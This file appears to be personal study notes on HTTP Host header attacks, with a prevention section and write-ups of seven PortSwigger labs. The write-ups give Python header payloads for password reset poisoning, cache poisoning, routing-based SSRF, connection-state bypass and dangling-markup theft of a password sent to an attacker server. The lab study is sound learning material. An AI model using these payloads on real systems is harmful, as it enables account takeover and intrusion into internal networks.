@@ -1,0 +1,312 @@
+HTTP Host header:
+- A mandatory request header of HTTP/1.1
+- Example: when user visit https://portswigger.net/web-security, request will contain
+    GET /web-security HTTP/1.1
+    Host: portswigger.net
+- In some cases, request has been forwarded by intermediary system, host value may be altered before it reaches the BE component
+
+Purpose of the HTTP Host header:
+- Identify which BE component client want to communicate with
+- Different:
+    + In the past, ambiguity didn't exist becaise each IP address would only host for single domain
+    + Nowadays, due to ever-growing trend for cloud-based solutions and outsource of the related architecture, common for multiple web to be accessible at the same IP address
+    + Also increased as the result of IPv4 address exhaustion
+- Virtual hosting:
+    + Possible: multiple web - single owner, multiple owner - single shared platform (less common but still occurs with some cloud-based SaaS solutions)
+    + In either case, although have different domain name but can still share a common IP address with server (aka virtual hosts)
+- Routing traffic via an intermediary:
+    + Websites are hosted on distinct BE servers, but all traffic is routed through an intermediary system
+    + Could be simple load balancer or a reverse proxy server
+    + This setup is especially prevalent in cases where clients access the web via content delivery network (CDN)
+    + In this case, all of their domain names resolve to a single IP address
+    + This present a challenges as virtual hosting because it need to know the appropriate BE which it should route each request
+- How HTTP Host header solve this problem:
+    + Host header is relied to specify the intended recipient
+    + This problem like sending letter to somebody who lives in an apartment building, entire building has same street address, but behind this address are many different apartment need to receive correct email
+    + Solution: include apartment number of recipient's name in address
+    + Process:
+        + Browser send request
+        + Target URL resolve to IP address of a particular server
+        + Server receive request
+        + Refer Host header to determine the intended BE and forwards request
+
+Host header attack:
+- If server implicitly trust Host header and fail to validate or escape, attacker may be able to inject harmful payload (aka Host header injection)
+- Off-the-shelf web typically don't know what domain they are deployed on, unless it is manually specified a config file during setup
+    + To know current domain, they may retrieve it froms Host header
+    <a href="https://_SERVER['HOST']/support">Contact support</a>
+- Some type of vuln:
+    + Web cache poisoning
+    + Business logic flaws in specific functionality
+    + Routing-based SSRF
+    + Classic server-side vuln (such as SQL injection)
+
+How vulnerabilities arise:
+- Typically due to flawed assumption that the header is not user controllable
+- Even if header itself is handled more securely, other methods still exist:
+    + Depend on the config of server that deal with incoming requests, header can potentially be overidden by injecting other headers
+    + Sometimes web owners are unware that header are supported by default, they may not be treated with the same level of scrutiny
+- In fact, many vuln arise not of insecure coding but because of insecure config of one or more components in related infrastructure
+    + Can occur because websites integrate third-party technologies without understanding the config options and their security implications
+
+Identify vulnerabilities using HTTP Host header:
+- Supply an arbitrary Host header:
+    + First step is to test what happen when supply an arbitrary domain name
+    + Problem with normal proxies make this testing impossible:
+        + Some intercepting proxies derive target IP from Host header directly
+        + Any changes would cause request to be sent to a different IP
+    + Burp Suite advantage:
+        + Separate between Host header and the target IP address
+        + Allow supply any arbitrary or malformed Host header while still sending to intended target
+    + Possible outcome:
+        + Success (still access target):
+            + Servers config with a default or fallback option in case they receive request for domain name they don't recognize
+            + If target happen to be default, can begin studying how app handle Host header
+        + Fail (can not reach target):
+            + FE or load balancer received request may simply don't know where to forward it
+            + Resulting in an "Invalid Host header" error
+            + Especially likely if target accessed via CDN
+            + Move on to trying some of the techniques
+- Check for flawed validation:
+    + Instead of "Invalid Host header" response, might be blocked as a result of security measure
+        + Example: validate Host header matches SNI from TLS handshake
+        + But it not mean that they are immune to Host header attacks
+    + Try to understand how web parses Host header, sometimes can be used to bypass validation
+        + Port omission: some algo omit port, only validate domain
+            + If able to supply a non-numeric port, can leave domain untouched to ensure reach the target application
+                Host: vulnerable-website.com:bad-stuff-here
+        + Subdomain matching: allow arbitrary subdomains
+            + May bypass validation by registering an arbitrary domain that end with the same sequence of characters as a whitelisted one
+            Host: notvulnerable-website.com
+        + Compromised Subdomain: take advantage of less-secure subdomain already hacked
+            Host: hacked-subdomain.vulnerable-website.com
+- Send ambiguous requests:
+    + Code validate host and code does vuln often reside in different app component or even on separate servers
+    + Exploit discrepancies in how they retrieve Host header -> may be able to issue ambiguous request appear to have different host depending on which system look at it
+    + Inject duplicate Host headers:
+        + This often just result in request being blocked
+        + Browser is unlikely send this type of request, dev may not anticipated this
+        + Different systems and technologies will handle differently, for 1 of 2 header often given over the other one, overriding value
+        + When systems disagree which is correct -> lead to discrepancies can exploit
+            GET /example HTTP/1.1
+            Host: vulnerable-website.com
+            Host: bad-stuff-here
+            + Behavior: FE gives precedence to first instance of header, but BE prefers final instance
+            + Exploit: first header to ensure routed to intended target, second header to pass payload
+    + Supply an absolute URL:
+        + Request line typically specifies a relative path, but many servers config to understanding absolute URL
+        + The ambiguity caused by supply absolute URL and Host header can lead to discrepancies between different system
+        + Officially request line given precedence when routing, in practice not always case
+            GET https://vulnerable-website.com/ HTTP/1.1
+            Host: bad-stuff-here
+    + Add line wrapping:
+        + Indent HTTP headers with space character
+        + Some servers treat it as part of the preceding header's value, some will ignore it
+            GET /example HTTP/1.1
+                Host: bad-stuff-here
+            Host: vulnerable-website.com
+        + Web may block request with multiple Host header, may be able to bypass validation by indenting one
+        + If FE ignore indented header, request will be processed as ordinary
+        + BE ignore leading space and prefer first header -> allow pass arbitrary value via wrapped header
+    + Other techniques:
+        + Can adapt many HTTP request smuggling techniques to construct Host header attacks
+- Inject host override headers: (X-Forwarded-Host)
+    + Even if can't overide using ambiguous request, can use other HTTP headers designed for this purpose (although for more innocent use cases)
+    + Web often accessed via some kind of intermediary system (such as load balance or reverse proxy)
+        + In this architecture, Host header BE receives may contain domain name for one of these intermediary systems
+    + FE may inject X-Forwarded-Host header, contain original value of Host header from client's initial request
+    + Many framework will refer to X-Forwarded-Host instead of Host
+    + Can use to inject malicious input while circumventing validation on Host header itself
+        Host: vulnerable-website.com
+        X-Forwarded-Host: bad-stuff-here
+    + Similar headers:
+        + X-Host
+        + X-Forwarded-Server
+        + X-HTTP-Host-Override
+        + Forwarded
+    + Tip: use Param Miner extension's Guess headers to automatically probe for supported headers using extensive built-in wordlist
+
+
+How to exploit HTTP Host header:
+- Password reset poisoning: (1)
+    + Technique where attacker manipulate a vuln web into generating a password reset link pointig to domain under their control
+    + Can leverage to steal secret token to reset user's password and compromise their account
+    + Process of password reset:
+        1. User enter username or email, submit request
+        2. Web check if user exist -> gen temp, unique, high entropy token, which associates with user's account on BE
+        3. Send link reset password to email
+        4. Click url -> web check if token is valid and which account is being reset -> After reset password, token is destroyed
+    + But it relies on principle that only intended user has access to their email and unique token
+
+    + If Url generate based on controllable input, such as Host header, possible to construct password reset poisoning attack as follows
+        1. Attacker obatins victim's email or username, submit password reset request on their behalf. Modify Host header point to domain that they control
+        2. Victim receive password reset email, but domain name in URL is attacker server
+        3. Victim click this link (or fetched in some way, or by virus scanner) -> password reset token will be delevered to attacker's server
+        4. Now attacker be able to reset user's password to whatever they like
+    + In real attacker, to increase probability of victim click link, by first warming them up with a fake breach notification
+    + Even if you can't control password reset link, you still can use Host header to inject HTML into sensitive emails
+- Web cache poisoning via the Host header: (3)
+    + When probing for attacks, often come across vuln behavior that isn't directly exploitable
+    + Sometimes Host header is reflected in response markup without HTML-encoding, or even used directly in script imports
+        + But XSS are typically not exploitable when caused by Host header
+        + There is no way for attacker to force victim to issue incorrect host in useful manner
+    + However, if target uses a web cache, possible to turn vuln into dangerous by let cache serve a poisoned response to other users
+    + To construct web cache poisoning attack, need to elicit response from server that reflect an injected payload
+        + Challenge is do this while preserving a cache key that still be mapped to other users's request
+        + Store malicious response cached (it will be served to any users attempt to visit)
+    + Cache key considerations:
+        + Standalone caches typically include Host header in cache key -> hard to poison (each Host have different cache key)
+        + Works best on integrated, application level caches (not include Host header in cache key)
+        + Techniques discussed earlier can sometimes enable poisoning even standalone caches
+- Exploiting classic server-side vulnerabilities;
+    + Every HTTP header is a potential vector for exploiting classic server-side vuln
+    + Example: try SQL injection techniques vis Host header
+- Accessing restricted functionality: (2)
+    + For some reason, it is common for web to restrict access to internal users only
+    + However, some web access control make flawed assumption that allow to bypass these restriction by making simple midify to Host header
+- Accessing internal websites with virtual host brute-forcing:
+    + Companies sometimes make mistake of hosting publicly accessible web and privae, internal site on same server (have both public and private IP)
+    + As internal hostname may resolve to private IP (can't detect by looking at DNS records)
+    + In some cases, internal site might not have a public DNS record
+        + But attacker can typically access any virtual host on any server they have access to (they can brute-force hostnames)
+- Routing-based SSRF: (4, 5)
+    + Sometimes known as Host header SSRF attacker
+    + Definition:
+        + Classic SSRF vuln usually based on XXE or exploitable business logic
+        + Routing-based SSRF: exploit intermediary components (like load balancers and reverse proxies)
+    + How it work:
+        + They all receive request and forward to appropriate BE
+        + If insecurely config to forward request based on unvalidated Host header -> can be manipulated into misrouting request
+    + Why dangerous:
+        + Sit in privileged network position -> Allow to receive request directly
+        + Have access to internal network -> Can transform into gateway to entire internal network
+    + Can use Burp Collaborator to identify these vuln by rerouting request to attacker's server
+    + Exploit:
+        + Identify private IP on internal network:
+            + Check for leaked IP in application
+            + Scan company hostnames for private IP resolution
+            + Bruteforce standard IP range (e.g. 192.168.0.0/16)
+    + CIDR notation: (Classless Inter-Domain Routing)
+        + IPv4 address: 4 octets (8-bit decimal), each 0-255
+            + Lowest: 0.0.0.0, highest: 255.255.255.255
+        + Format:
+            + 10.0.0.0/8: first 8 bits fixed (first octet) (10.0.0.0 -> 10.255.255.255)
+            + 192.168.0.0/16: first 16 bits fixed (first 2 octets) (192.168.0.0 -> 192.168.255.255)
+- Connection state attacks: (6)
+    + For performance reasons, many web reuse connection for multiple request/response
+    + Dangerous assumption: certain properties are identical for all HTTP/1.1 requests sent over the same connection (such as Host header)
+    + Poorly implemented can lead to number of potential issues
+        + Some server only perform validation on first request of connection
+    + Exploit:
+        + Send normal request with header Connection: keep-alive
+        + Send second request with modified Host header
+- SSRF via a malformed request line:
+    + Custom proxues sometimes fail to validate the request line properly
+    + Example:
+        GET @private-intranet/example HTTP/1.1
+        https://{username}:{password}@{domain}
+
+How to prevent HTTP Host header attacks:
+- Simplest approach: avoid using Host header altogether in server-side code
+    + Check if url really need to be absolute
+    + Use relative URL instead when possible
+- Protect absolute URLs:
+    + When have to use absolute URL, require current domain manually in config file and refer to this instead of Host header
+    + Help eliminate the threat of password reset poisoning
+- Validate the Host header:
+    + In case must use Host header, make sure to validate properly
+    + Check it against whitelist domain and reject unrecognized hosts
+    + Read document of framework (Example: Django provides ALLOWED_HOSTS option in setting file)
+- Don't support Host override headers:
+    + Do not support additional headers used to construct these attack (e.g. X-Forwarded-Host)
+    + Some headers will supported by default, need to disable manually
+- Whitelist permitted domains:
+    + Prevent routing-based attacks on internal infrastructure
+    + Config load balancer or any reverse proxies to forward request only to whitelist domain
+- Be careful with internal-only virtual hosts:
+    + When using virtual hosting, avoid hosting internal-only web and application on the same server
+    
+
+01_Basic_password_reset_poisoning
+- Go to /forgot-password and send request using param username=carlos
+- Intercept that request in burp suite and modify Host header point to exploit server
+    + Repeat that request, victim will click anything received
+    + After victim click it, as Host header point to attacker's server, it will send to log
+    + So we check and get the victim's token
+- Change password and login as usual
+- Payload to overide Host header:
+    custom_headers = {
+        'Host': exploit_url.split('//')[1],
+    }
+- Note:
+    + Idk why but for some reason, behavior of overide Host header through python code is different from Burp modify
+    + In python code, it will go to website based on Host header, but directly Burp request is not
+    + All we need is poison Host header but still redirect to true website, so it doesn't work using python request lib
+    + It took me about 10h at first day just to debug and search for issues but still not working (i just waste a lots time)
+- Ps: 2 days later, i finally found the way to do with python code, but didn't know root cause yet
+
+02_Host_header_authentication_bypass
+- Base on lab description, we know that "privilege level of the user based on the HTTP Host header"
+- So if we change to localhost, will have full access control to functionality
+- Payload:
+    custom_headers = { 'Host': 'localhost' }
+
+03_Web_cache_poisoning_via_ambiguous_requests
+- If you duplicate the Host header, you can change the url in home page
+    <script type="text/javascript" src="//{Second Host header}/resources/js/tracking.js">
+    + It still counting first Host header but only second Host is added in src
+- And if you read the response, it will contain X-Cache
+    X-Cache: miss
+    X-Cache: hit
+    + Meaning that if you send any request twice, it will be cached
+- In attacker's server, create a page /resources/js/tracking.js contain vuln payload
+- Try to duplicate Host header point to attacker's server and poisoning cache
+    + So every time user load page will get the one in poison cache
+- But headers in request is CaseInsensitiveDict() and can't add like normal
+    + https://stackoverflow.com/questions/16789840/python-requests-cant-send-multiple-headers-with-same-key
+    + Read this blog about how it works and way of duplicate header
+- Host header payload:
+    custom_headers = {
+        'Host': url.split('//')[1],
+        uniquestr('Host'): exploit_url.split('//')[1],
+    }
+
+04_Routing_based_SSRF
+- First just bruteforce IP of internal network via Host header (192.168.0.1 -> 192.168.0.255)
+- Then if it is valid IP, will contain API to delete user in home page
+
+05_SSRF_via_flawed_request_parsing
+- In some case, absolute URL will take priority over Host header
+    + Using absolute URL in request method
+        GET https://{lab_id}.web-security-academy.net/
+    + Then modify the Host header
+        Host: burp_collaborator_domain
+    + Just with this, all request will be redirect to your server
+- Then modify absolute url to bruteforce IP of internal network
+- Then if it is valid IP, will contain API to delete user in home page
+
+06_Host_validation_bypass_via_connection_state_attack
+- If normally modify Host header to internal network, it will redirect to homepage
+- Notice this using TCP connection and reuse it
+    + But validation only work at first request
+    + In second request, it not check properly and allow we to modify the Host header
+- Exploit:
+    + Send first request to init TCP connection, second request to extract API path and csrf token
+    + Last request to call API trigger delete user 
+
+07_Password_reset_poisoning_via_dangling_markup
+- Lab note: "Some antivirus software scans links in emails to identify whether they are malicious."
+- Try trigger reset password, it will send you new password in email
+- If you try to adding :@{exploit_url} after Host header, i will see that it vuln to validate port
+- Even you know that vuln, but new password is outside of <a> tag
+    + You can control inside <a> tag
+    + Try <img> tag but has been ignored by antivirus software
+    + So try to construct payload with allowed tag such as <a>
+- Because there is no " character in default html
+    + So if you try to start with ", it will contain the rest of html as part of url
+    + Turn all of that to temp param and send to attacker's server
+- Got new password, so just login as usual 
+- Payload to overide Host header:
+    custom_headers = {
+        'Host': f"""{url.split('//')[1]}:'<a href="{exploit_url}?"""
+    }
